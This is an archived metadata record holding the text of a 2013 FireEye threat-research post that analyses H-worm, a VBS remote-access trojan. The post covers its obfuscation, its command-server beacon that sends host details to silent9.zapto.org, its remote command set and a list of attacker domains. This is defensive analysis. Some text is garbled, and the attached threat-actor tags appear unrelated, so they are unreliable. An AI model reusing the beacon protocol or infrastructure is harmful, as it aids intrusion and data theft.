{
    "id": "68ba43b1-9e4c-48a6-9fd5-7382885589b1",
    "created_at": "2023-01-12T15:02:02.351056Z",
    "updated_at": "2025-03-27T02:16:26.17796Z",
    "deleted_at": null,
    "sha1_hash": "90c1fc30479ef0ce5200ac5b433914602086c62c",
    "title": "2013-09-24 - Now You See Me - H-worm by Houdini",
    "authors": "",
    "file_creation_date": "2022-05-28T02:27:03Z",
    "file_modification_date": "2022-05-28T02:27:03Z",
    "file_size": 87218,
    "plain_text": "# Now You See Me - H-worm by Houdini\n\n**fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html**\n\nThreat Research\n\nThoufique Haq, Ned Moran\n\nSep 24, 2013\n\n5 mins read\n\nMalware\n\nH-worm is a VBS (Visual Basic Script) based RAT written by an individual going by the name Houdini. We believe the author is based in\nAlgeria and has connections to njq8, the author of njw0rm [1] and njRAT/LV [2] through means of a shared or common code base. We have\nseen the H-worm RAT being employed in targeted attacks against the international energy industry; however, we also see it being employed in\na wider context as run of the mill attacks through spammed email attachments and malicious links.\n\n**The Payload**\n\nThe H-worm payload is simply a VBS file, which is often wrapped, in a PE executable dropper. The H-worm VBS file is also packed with\n[multiple layers of obfuscation in some cases. While analyzing such samples (81c153256efd9161f4d89fe5fd7015bc and](https://www.virustotal.com/en/file/3c63b1f8081ce2c617f171da6c4a9300aa66c57efeb5b70eaef6aa929e3e8f7b/analysis/)\n[4543daa6936dde54dda8782b89d5daf1), we discovered that they were obfuscated with custom Base64 encoding, multiple levels of standard](https://www.virustotal.com/en/file/10f34ce36745a4b7ff7d584132b5d865fde02f0086c8bbfef58b18322ea225d9/analysis/)\n[Base64 encoding (Safa Crypter), and character substitutions. The obfuscation techniques used have been described here [3] already and are](https://www.virustotal.com/en/file/945374cbb07f910c5e7d06b12b65b21336bf7cc7fa67f8bd894018bdf6bebb3e/analysis/)\nsummarized in Figure 1 below. There is also an [Autoit version of H-worm called the \"underworld version\" floating around which has the same](http://pastebin.com/vMQWsvHS)\nfunctionality as the VBS version.\n\n\n-----\n\nMultiple layers of obfuscation\n\n\nFigure 1: Multiple layers of obfuscation\n\n**Dissecting Command and Control (CnC) Behavior**\n\nUpon successful compromise, the worm generates network telemetry (beacon), as shown below:\n\n**POST /is-ready HTTP/1.1**\n\nAccept: */*\n\nAccept-Language: en-us\n\nUser-Agent: {DiskVolumeSerial}<|>{Hostname}<|>{Username}<|>{OS}<|>plus<|>{AVProductInstalled or nan-av}<|>{USBSpread: true or false} {CurrentSystemDate}\n\nAccept-Encoding: gzip, deflate\n\nHost: silent9.zapto.org:7895\n\nContent-Length: 0\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nAs seen in the beacon, it sends out various pieces of sensitive identification information in the User-Agent field. We have also observed\nversions where the URI was modified to use other strings such as \"POST /I_AM_READY\". The keyword \"<|>plus<|>\" is constant in the beacon\nbut we have seen versions where this was modified as well. We saw instances where \"<|>underworld final<|>\" was used instead. It expects a\nresponse of the form:\n\n{command}<|>{param1}<|>{param2}\n\nThe worm supports the following remote commands:\n\n**Command** **Description** **Communication Request generated**\n\n\nexecute\nexecute\n\nupdate\nupdate\n\n\nExecutes param value using 'execute' Executes param\nvalue using 'execute'\n\nReplaces the payload and restarts with the wscript\nengine Replaces the payload and restarts with the\nwscript engine\n\n\n\n- \n- \n\n-----\n\nuninstall\nuninstall\n\n\nDeletes startup entries and payload Deletes startup\nentries and payload\n\n\nsend send Downloads file from CnC server Downloads file from\nCnC server\n\n\n\n- \nPOST /is-sending<|>{FileURL}… POST /is-sending<|>\n{FileURL}…\n\n\nsite-send\nsite-send\n\n\nDownloads file from URL Downloads file from URL GET /{FileURL}… GET /{FileURL}…\n\n\nrecv recv Uploads file to CnC server Uploads file to CnC server POST / is-recving<|>{FilePath}… POST / is-recving<|>\n{FilePath}…\n\n\nenum-driver\nenum-driver\n\nenum-faf\nenum-faf\n\nenumprocess\nenumprocess\n\ncmd-shell\ncmd-shell\n\n\nSends all drive information to the CnC Sends all drive\ninformation to the CnC\n\nSends all file and folder attributes in a specified directory\nSends all file and folder attributes in a specified directory\n\nSends all running processed Sends all running\nprocessed\n\nExecutes param value with ‘cmd.exe /c’ and returns\nresult Executes param value with ‘cmd.exe /c’ and\nreturns result\n\n\ndelete delete Deletes file or folder specified in param Deletes file or\nfolder specified in param\n\n\nexit-process\nexit-process\n\n\nKills process specified in param Kills process specified in\nparam\n\n\nPOST /is-enum-driver…{DrivePath|DriveType<|>…} POST /isenum-driver…{DrivePath|DriveType<|>…}\n\nPOST /is-enum-faf…{FolderName|(FileSize)|\n(d|f)|Attributes<|>…} POST /is-enum-faf…{FolderName|\n(FileSize)|(d|f)|Attributes<|>…}\n\nPOST /is-enum-process…{Name|PID|Path<|>…} POST /isenum-process…{Name|PID|Path<|>…}\n\nPOST /is-cmd-shell…{Result} POST /is-cmd-shell…{Result}\n\n- \n- \n- \n\nsleep sleep Sleep call in param is passed to eval() Sleep call in\nparam is passed to eval()\n\nTable 1 - Remote commands available in H-worm\n\n**Behind The Curtains**\n\n\nThe control panel for H-worm has a builder and a controller interface to interact with the infected machine. The control panel is written in\nDelphi. Some of the features such as password grabber and USB spreading were not functional in the versions we analyzed. These features\ncould be operational in newer versions of H-worm.\n\n\n-----\n\nControl panel of H worm\n\n\nFigure 2: Control panel of H-worm\n\nThe author, Houdini, has a portal to show off his wares, which hosts a demonstration video of H-worm. The contents of the portal indicate that\nhe is proficient in both French and Arabic. Based on this and various other identifiable clues in the video, it is likely that the author of H-worm is\nfrom Algeria. We also believe the thumbnail images briefly seen in the video may be of the author himself. For the keen eyed observers, it is\nalso evident that the author likes to play \"Beetle Bug 2\" and \"Chicken invaders 4\".\n\n\nSnippets from Houdini's demo of H-worm\n\n\nFigure 3: Snippets from Houdini's demo of H-worm\n\n\n**CnC Intel Analysis**\n\n\n-----\n\nO u t e a a ys s o t e co a d a d co t o ast uctu e, e d sco e ed t at t e C C ast uctu e used by so e o t e o a a ts\nwere shared by others RATs such as NjW0rm, njRat/LV, XtremeRAT, and PoisonIvy. The attackers behind these instances appear to have an\narsenal of RATs at their disposal, in order to perform various attack campaigns.\n\n**CnC Domain** **Other associated RATs**\n\n**silent9.zapto.org** Njw0rm a85c29d11016c633ef228fc58ebe2c14\n\n**adolf2013.sytes.net** XtremeRAT 12cc632f24497a2aa9bed63d36c2725d\n\n**ballgogo.no-ip.biz** XtremeRAT 80b1f909d1217313c14ea6d4d0b003dc\n\n**pess-12.zapto.org** DarkComet 6f3bad9a426a867f3ebf34bb68a75fe9\n\n**sidisalim.myvnc.com** LV 82e6fc9a6b06fb51c134ba1755be23be\n\n**xkiller.no-ip.info** LV be871515ce8246118446de9d563803231c2f0dd9613f52a73a8a1b1a8f\ne96a6b06b0b46bd3cde7137c47137643\n\n**karimstar.zapto.org** LV 3034ab284cf07b9215fb0ca715d3660f\n\n**securityfocus.bounceme.net** LV 72679f31721e82111cc8797e0a6d7db48fa4,\n0399e7bdcb2664a7634ac3ad3140\n\n**kiyoma200.no-ip.biz** LV 945471684a57e1e6b73c0f22beceb25c, 471d61e7a3d936fa28efef3273\n\nPoisonIvy d833ba1b0ac9b512382433f47084bf52,\neaba668520690207f07eb99fcd4c0cae\n\nTable 2 - Direct overlaps on command and control infrastructure\n\n**Possible Connections to the njq8 Enterprise**\n\nWe recently talked about njw0rm [1] and the author behind it, njq8. We found strong connections indicating that njw0rm and njRAT/LV [2] were\nwritten by the same author. We believe H-worm is also linked to njq8, through a shared code base. An earlier version of H-worm was analyzed\n[here [4], by another researcher. It is evident from this older version, that the client side module was originally coded by njq8. The older version](http://laudarch.blogspot.com/2013/05/serviecavbs-reverse-engineered.html)\nbeacons with \"POST /ready\" instead of \"POST /is-ready\", as seen in the newer versions. This blog was re-tweeted on the njq8 twitter page.\nOur earlier njw0rm blog was also promptly re-tweeted on the njq8 twitter page. It is unclear how connected Houdini and njq8 are, but it is likely\nthat njq8 is a group of individuals collaborating on the development of RATs, or alternatively, there are development forks on the same code\nbase by multiple authors.\n\n\nCommon code base and njq8 connections\n\n\nFigure 4: Common code base and njq8 connections\n\n\n-----\n\n**o** **as es**\n\n00df326eee18617fae2fdd3684ac1546\n\n1488cdc5c5c9c87b4e0dae27ba3511cb\n\n4543daa6936dde54dda8782b89d5daf1\n\n80b1f909d1217313c14ea6d4d0b003dc\n\n81c153256efd9161f4d89fe5fd7015bc\n\nc6b53fc46427527a0739e6b6443ef72d\n\n9e273220eb71f849ea99b923cbc1fae3\n\n43309710ab8f87dc5d9842a5bca85f80\n\na40faab2f3f546aeb29aaefcb0f751d8\n\n617a128b44671ac88df0b7180d9d0135\n\nae5c8ad09954a56f348a3b72ed824363\n\nda3e2eeffd78d8c5ef472b8a09e9d325\n\n**H-worm Command and Control (CnC) Infrastructure**\n\nadamdam.zapto.org:1973\n\nadolf2013.sytes.net:1183\n\nadolf2013.sytes.net:1184\n\nahmad212.no-ip.biz:86\n\nalii007.zapto.org:288\n\nalii007.zapto.org:6611\n\nam1.no-ip.info:1888\n\nballgogo.no-ip.biz:8088\n\nbasss.no-ip.info:2026\n\nbasss.no-ip.info:82\n\nbg1337.zapto.org:1155\n\nbog5151.zapto.org:991\n\ndataday3.no-ip.org:83\n\ndocteuur13.no-ip.org:444\n\ndoda.redirectme.net:777\n\ndzhacker15.no-ip.org:82\n\ng00gle.sytes.net:4448\n\ngerssy.zapto.org:6000\n\ngooglechrome.servegame.com:1990\n\nhackediraq.no-ip.biz:88\n\nhackeralbasrah.no-ip.biz:8888\n\nhattouma12.no-ip.biz:88\n\nhmode123.no-ip.biz:9090\n\n\n-----\n\na sta apto o g 85\n\nkiyoma200.no-ip.biz:1117\n\nkoko.myftp.org:9090\n\nmda.no-ip.org:88\n\nmedolife.no-ip.biz:1247\n\nmicrosoftsystem.sytes.net:4442\n\nmootje01.no-ip.org:81\n\nmsgbox.zapto.org:5246\n\nnew-hacker.no-ip.org:81\n\nnjnj.redirectme.net:123\n\nno99.zapto.org:81\n\nnoooot.no-ip.biz:443\n\npess-123.zapto.org:1604\n\npess-12.zapto.org:81\n\nportipv6.redirectme.net:1991\n\nronaldo-123.no-ip.biz:2011\n\nronaldo-123.no-ip.biz:2013\n\nsawdz.no-ip.biz:333\n\nsecurityfocus.bounceme.net:1166\n\nshagagy21.no-ip.biz:1605\n\nsidisalim.myvnc.com:1888\n\nsilent9.zapto.org:7895\n\nterminator9.zapto.org:1991\n\nvpn-hacker.no-ip.biz:9090\n\nxbox720.zapto.org:1991\n\nxkiller.no-ip.info:1\n\nyahia17.no-ip.org:1177\n\nzeusback.no-ip.biz:223\n\nzoia.no-ip.org:446\n\n**References:**\n\n[1] /content/fireeye-www/global/en/www/blog/threat-research/2013/08/njw0rm-brother-from-the-same-mother.html\n\n[2] /content/fireeye-www/global/en/www/blog/threat-research/2012/09/the-story-behind-backdoorlv.html\n\n[3] http://pwndizzle.blogspot.com/2013/09/how-not-to-obfuscate-your-malware.html\n\n[4] http://laudarch.blogspot.com/2013/05/serviecavbs-reverse-engineered.html\n\nWe would like to thank Darien Kindlund, Nart Villeneuve, Uttang Dawda, Mike Scott, and Ali Mesdaq for their help and support.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2013/2013-09-24 - Now You See Me - H-worm by Houdini.pdf"
    ],
    "report_names": [
        "2013-09-24 - Now You See Me - H-worm by Houdini.pdf"
    ],
    "threat_actors": [
        {
            "id": "33f527a5-a5da-496a-a48c-7807cc858c3e",
            "created_at": "2022-10-25T15:50:23.803657Z",
            "updated_at": "2025-03-27T02:00:55.550132Z",
            "deleted_at": null,
            "main_name": "PLATINUM",
            "aliases": [
                "PLATINUM"
            ],
            "source_name": "MITRE:PLATINUM",
            "tools": [
                "JPIN",
                "Dipsind",
                "adbupd"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7d8ef10e-1d7b-49a0-ab6e-f1dae465a1a4",
            "created_at": "2023-01-06T13:46:38.595679Z",
            "updated_at": "2025-03-27T02:00:02.869216Z",
            "deleted_at": null,
            "main_name": "PLATINUM",
            "aliases": [
                "TwoForOne",
                "G0068",
                "ATK33"
            ],
            "source_name": "MISPGALAXY:PLATINUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e61c46f7-88a1-421a-9fed-0cfe2eeb820a",
            "created_at": "2022-10-25T16:07:24.061767Z",
            "updated_at": "2025-03-27T02:02:10.094583Z",
            "deleted_at": null,
            "main_name": "Platinum",
            "aliases": [
                "ATK 33",
                "Operation EasternRoppels",
                "TwoForOne"
            ],
            "source_name": "ETDA:Platinum",
            "tools": [
                "AMTsol",
                "Adupib",
                "Adupihan",
                "Dipsind",
                "DvDupdate.dll",
                "JPIN",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "RedPepper",
                "RedSalt",
                "Titanium",
                "adbupd",
                "psinstrc.ps1"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535722,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653704823,
    "ts_modification_date": 1653704823,
    "files": {
        "pdf": "https://archive.orkl.eu/90c1fc30479ef0ce5200ac5b433914602086c62c.pdf",
        "text": "https://archive.orkl.eu/90c1fc30479ef0ce5200ac5b433914602086c62c.txt",
        "img": "https://archive.orkl.eu/90c1fc30479ef0ce5200ac5b433914602086c62c.jpg"
    }
}